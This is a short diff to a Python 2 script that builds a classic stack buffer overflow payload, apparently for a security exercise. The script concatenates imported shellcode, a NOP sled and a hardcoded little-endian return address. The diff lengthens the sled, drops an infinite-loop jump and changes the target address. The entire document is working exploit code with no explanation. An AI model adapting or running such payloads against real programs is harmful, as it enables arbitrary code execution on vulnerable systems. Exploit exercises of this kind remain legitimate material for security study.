@@ -1,4 +1,4 @@
-from shellcode import shellcode 
+from shellcode import shellcode
 from struct import pack
 
-print shellcode+'\x90'*87+'\xeb\xfe'+pack("<I",0xbffff542)
+print shellcode + '\x90' * 89 + pack("<I", 0xbffef3fc)
